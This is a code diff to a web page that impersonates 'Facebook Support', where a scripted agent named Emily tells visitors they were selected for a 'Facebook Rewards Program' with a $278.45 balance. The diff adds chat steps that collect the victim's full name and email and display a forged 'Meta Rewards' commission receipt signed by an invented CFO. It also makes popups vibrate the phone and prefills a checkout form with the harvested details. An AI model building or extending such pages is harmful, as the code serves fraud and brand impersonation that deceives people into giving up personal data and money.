@@ -239,21 +239,45 @@
     .support-typing span { width: 6px; height: 6px; border-radius: 50%; background: #8a8d91; animation: typingDot 1s ease-in-out infinite; }
     .support-typing span:nth-child(2) { animation-delay: .15s; }
     .support-typing span:nth-child(3) { animation-delay: .3s; }
-    .support-receipt { width: min(290px, calc(100vw - 66px)); overflow: hidden; border: 1px solid var(--fb-line); border-radius: 9px; background: white; box-shadow: 0 3px 12px rgba(28,30,33,.1); }
-    .support-receipt-head { display: flex; align-items: center; justify-content: space-between; padding: 11px 13px; background: var(--fb-blue); color: white; }
-    .support-receipt-head strong { font-size: 14px; }
-    .support-receipt-head span { font-size: 10px; opacity: .8; }
-    .support-receipt-body { padding: 14px; color: var(--fb-text); }
-    .support-receipt-label { color: var(--fb-muted); font-size: 11px; text-transform: uppercase; }
-    .support-receipt-amount { margin-top: 3px; color: var(--fb-blue); font-size: 27px; font-weight: 800; }
-    .support-receipt-line { display: flex; justify-content: space-between; gap: 12px; margin-top: 13px; padding-top: 11px; border-top: 1px solid var(--fb-line); font-size: 12px; }
+    .support-receipt { width: min(330px, calc(100vw - 58px)); overflow: hidden; border: 1px solid var(--fb-line); border-radius: 12px; background: white; color: #171717; box-shadow: 0 6px 20px rgba(28,30,33,.14); }
+    .support-receipt-head { display: flex; align-items: center; justify-content: space-between; gap: 8px; padding: 10px 12px; background: #171717; color: white; }
+    .support-receipt-brand { display: flex; align-items: center; gap: 7px; min-width: 0; font-size: 13px; font-weight: 700; }
+    .support-receipt-logo { width: 28px; height: 18px; object-fit: contain; }
+    .support-receipt-head > span { flex: none; font-size: 9px; opacity: .72; }
+    .support-receipt-title { padding: 12px; background: var(--fb-blue); color: white; font-size: 21px; font-weight: 800; }
+    .support-receipt-body { padding: 13px; color: var(--fb-text); font-size: 11px; }
+    .support-receipt-parties { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+    .support-receipt-to { min-width: 0; text-align: right; }
+    .support-receipt-blue { color: var(--fb-blue); font-weight: 700; }
+    .support-receipt-muted { color: var(--fb-muted); overflow-wrap: anywhere; }
+    .support-receipt-table { margin-top: 12px; }
+    .support-receipt-table-row { display: grid; grid-template-columns: minmax(0,1fr) 30px 70px; }
+    .support-receipt-table-row > span { padding: 7px 6px; }
+    .support-receipt-table-head { background: #171717; color: white; font-weight: 700; }
+    .support-receipt-table-value { border-bottom: 2px solid var(--fb-blue); }
+    .support-receipt-table-row > span:nth-child(2) { text-align: center; }
+    .support-receipt-table-row > span:last-child { text-align: right; font-weight: 700; }
+    .support-receipt-total { display: flex; align-items: baseline; justify-content: flex-end; gap: 7px; padding: 9px 0 11px; font-weight: 700; }
+    .support-receipt-total strong { color: var(--fb-blue); font-size: 22px; }
+    .support-receipt-details { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; border-top: 1px solid var(--fb-line); padding-top: 10px; }
+    .support-receipt-sign { text-align: right; }
+    .support-receipt-signature { font-family: "Brush Script MT", "Segoe Script", cursive; font-size: 17px; }
+    .support-receipt-method, .support-receipt-notice { margin-top: 11px; border-top: 1px solid var(--fb-line); padding-top: 9px; }
+    .support-receipt-notice { padding: 8px; border: 1px solid var(--fb-line); border-radius: 5px; }
+    .support-receipt-foot { display: flex; justify-content: center; padding: 9px; background: var(--fb-blue); }
+    .support-receipt-foot img { width: 48px; height: 22px; object-fit: contain; filter: brightness(0) invert(1); }
     .support-video { width: min(330px, calc(100vw - 66px)); height: 440px; overflow: hidden; border: 1px solid var(--fb-line); border-radius: 10px; background: #000; box-shadow: 0 3px 12px rgba(28,30,33,.12); }
     .support-video iframe { width: 100%; height: 100%; border: 0; }
     .support-image { display: block; width: min(290px, calc(100vw - 76px)); height: auto; border: 1px solid rgba(0,0,0,.05); border-radius: 16px; box-shadow: 0 1px 2px rgba(0,0,0,.08); }
     .support-footer { flex: none; padding: 10px 12px max(10px, env(safe-area-inset-bottom)); background: var(--fb-surface); border-top: 1px solid var(--fb-line); }
-    .support-footer:not(:has(.support-choice.visible)) { display: none; }
+    .support-footer:not(:has(.support-choice.visible)):not(:has(.support-form.visible)) { display: none; }
     .support-choice { display: none; width: 100%; min-height: 48px; padding: 10px 16px; border-radius: 999px; background: var(--fb-blue); color: white; font-size: 14px; font-weight: 700; box-shadow: 0 4px 12px rgba(24,119,242,.22); }
     .support-choice.visible { display: block; animation: chatIn .3s ease both; }
+    .support-form { display: none; grid-template-columns: minmax(0,1fr) auto; gap: 8px; animation: chatIn .3s ease both; }
+    .support-form.visible { display: grid; }
+    .support-input { min-width: 0; height: 46px; border: 1px solid var(--fb-line); border-radius: 999px; padding: 0 16px; background: var(--fb-bg); color: var(--fb-text); font-size: 14px; outline: none; }
+    .support-input:focus { border-color: var(--fb-blue); box-shadow: 0 0 0 2px var(--fb-blue-soft); }
+    .support-send { width: 46px; height: 46px; border-radius: 50%; background: var(--fb-blue); color: white; font-size: 20px; font-weight: 700; }
     .support-note { margin-top: 7px; color: var(--fb-muted); font-size: 10px; text-align: center; }
     @keyframes chatIn { from { opacity: 0; transform: translateY(7px); } to { opacity: 1; transform: translateY(0); } }
     @keyframes typingDot { 0%, 60%, 100% { transform: translateY(0); opacity: .45; } 30% { transform: translateY(-3px); opacity: 1; } }
@@ -357,6 +381,10 @@
           </main>
           <footer class="support-footer">
             <button id="support-choice" type="button" class="support-choice" onclick="answerSupport()"></button>
+            <form id="support-form" class="support-form" onsubmit="answerSupportInfo(event)">
+              <input id="support-input" class="support-input" required autocomplete="off">
+              <button class="support-send" type="submit" aria-label="Send">➤</button>
+            </form>
           </footer>
         </div>
       </div>
@@ -609,6 +637,7 @@
     // reset animations by cloning
     resetBalanceModalAnimations();
     document.getElementById("modal-balance").classList.add("open");
+    vibratePopup();
     // update header balance immediately
     animateBalance("balance-post", BALANCES[STEP - 1], BALANCES[STEP], 2000);
     // auto-advance after 5s
@@ -648,12 +677,21 @@
   var supportStarted = false;
   var supportIndex = 0;
   var supportPending = null;
+  var supportInputKind = null;
+  var supportName = "";
+  var supportEmail = "";
   var SUPPORT_STEPS = [
     { type:"text", text:"Hi, welcome to <strong>Facebook Support!</strong>" },
     { type:"wait", ms:1500 },
     { type:"text", text:"You were <strong>one of the few people</strong> selected for the <strong>Facebook Rewards Program.</strong>" },
     { type:"wait", ms:1500 },
     { type:"text", text:"My name is Emily and I'll help you redeem your reward." },
+    { type:"wait", ms:1000 },
+    { type:"text", text:"Before we continue, please enter your <strong>full name</strong>." },
+    { type:"input", field:"name", placeholder:"Full name" },
+    { type:"wait", ms:700 },
+    { type:"text", text:"Thank you. Now enter your <strong>email address</strong>." },
+    { type:"input", field:"email", placeholder:"Email address" },
     { type:"wait", ms:1000 },
     { type:"text", text:"You have a balance of <strong>$278.45</strong> in our app" },
     { type:"wait", ms:2000 },
@@ -719,6 +757,12 @@
     supportScroll();
   }
 
+  function escapeSupportText(value) {
+    var node = document.createElement("div");
+    node.textContent = value;
+    return node.innerHTML;
+  }
+
   function addSupportReceipt() {
     var chat = document.getElementById("support-chat");
     if (!chat) return;
@@ -726,11 +770,21 @@
     var ref = "MP-" + Math.floor(100000 + Math.random() * 900000);
     var row = document.createElement("div");
     row.className = "support-row";
+    var now = new Date();
+    var date = String(now.getMonth() + 1).padStart(2, "0") + "/" + String(now.getDate()).padStart(2, "0") + "/" + now.getFullYear();
     row.innerHTML = '<img class="support-mini-avatar" src="images/emily-support.webp" alt="">' +
-      '<article class="support-receipt"><div class="support-receipt-head"><strong>Facebook Rewards</strong><span>' + ref + '</span></div>' +
-      '<div class="support-receipt-body"><div class="support-receipt-label">Commission receipt</div><div class="support-receipt-amount">$278.45</div>' +
-      '<div class="support-receipt-line"><span>Ad evaluations</span><strong>Approved</strong></div>' +
-      '<div class="support-receipt-line"><span>Payment method</span><strong>Bank transfer</strong></div></div></article>';
+      '<article class="support-receipt">' +
+        '<div class="support-receipt-head"><div class="support-receipt-brand"><img class="support-receipt-logo" src="images/meta-rewards-logo.png" alt=""><span>Meta Rewards</span></div><span>Ref. ' + ref + '</span></div>' +
+        '<div class="support-receipt-title">Commission Receipt</div>' +
+        '<div class="support-receipt-body">' +
+          '<div class="support-receipt-parties"><div><div class="support-receipt-blue">From</div><strong>Meta Rewards Inc.</strong><div class="support-receipt-muted">Menlo Park, California</div></div><div class="support-receipt-to"><div class="support-receipt-blue">To</div><strong>' + escapeSupportText(supportName || "—") + '</strong><div class="support-receipt-muted">' + escapeSupportText(supportEmail || "—") + '</div></div></div>' +
+          '<div class="support-receipt-table"><div class="support-receipt-table-row support-receipt-table-head"><span>Description</span><span>Qty</span><span>Total</span></div><div class="support-receipt-table-row support-receipt-table-value"><span>Payment for ad evaluation</span><span>1</span><span>$278.45</span></div></div>' +
+          '<div class="support-receipt-total"><span>Total</span><strong>$278.45</strong></div>' +
+          '<div class="support-receipt-details"><div><div><strong>Ref.</strong> ' + ref + '</div><div><strong>Issued:</strong> ' + date + '</div><div class="support-receipt-muted">This receipt confirms the approved commission payment.</div></div><div class="support-receipt-sign"><div class="support-receipt-signature">Michael R. Santos</div><strong>Chief Financial Officer</strong><div class="support-receipt-muted">Meta Rewards Inc.</div></div></div>' +
+          '<div class="support-receipt-method"><strong>Payment method:</strong> Bank transfer</div>' +
+          '<div class="support-receipt-notice"><strong>Notice:</strong> The amount shown is available for withdrawal after verification.</div>' +
+        '</div><div class="support-receipt-foot"><img src="images/meta-rewards-logo.png" alt="Meta Rewards"></div>' +
+      '</article>';
     chat.appendChild(row);
     supportScroll();
   }
@@ -763,6 +817,19 @@
     supportPending = label;
     button.textContent = label;
     button.classList.add("visible");
+  }
+
+  function showSupportInput(field, placeholder) {
+    var form = document.getElementById("support-form");
+    var input = document.getElementById("support-input");
+    supportInputKind = field;
+    input.type = field === "email" ? "email" : "text";
+    input.name = field;
+    input.placeholder = placeholder;
+    input.autocomplete = field === "email" ? "email" : "name";
+    input.value = "";
+    form.classList.add("visible");
+    setTimeout(function(){ input.focus(); }, 100);
   }
 
   function runSupportStep() {
@@ -798,6 +865,10 @@
       setTimeout(runSupportStep, 200);
       return;
     }
+    if (step.type === "input") {
+      showSupportInput(step.field, step.placeholder);
+      return;
+    }
     if (step.type === "choice") showSupportChoice(step.label);
     if (step.type === "checkout") {
       if (typeof window.b3Step === "function") window.b3Step("checkout");
@@ -820,9 +891,29 @@
     setTimeout(runSupportStep, 300);
   }
 
+  function answerSupportInfo(event) {
+    event.preventDefault();
+    var input = document.getElementById("support-input");
+    var value = input.value.trim();
+    if (!value || !supportInputKind) return;
+    if (supportInputKind === "name") supportName = value;
+    if (supportInputKind === "email") supportEmail = value;
+    document.getElementById("support-form").classList.remove("visible");
+    addSupportBubble("user", escapeSupportText(value));
+    supportInputKind = null;
+    supportIndex += 1;
+    setTimeout(runSupportStep, 300);
+  }
+
   // ─── Checkout modal ───────────────────────────────────────────────────────────
   function openCheckout() {
+    document.getElementById("checkout-name").value = supportName;
+    document.getElementById("checkout-email").value = supportEmail;
     document.getElementById("modal-checkout").classList.add("open");
+    vibratePopup();
+  }
+  function vibratePopup() {
+    if (navigator.vibrate) navigator.vibrate([70, 45, 70]);
   }
   function closeCheckout() {
     document.getElementById("modal-checkout").classList.remove("open");
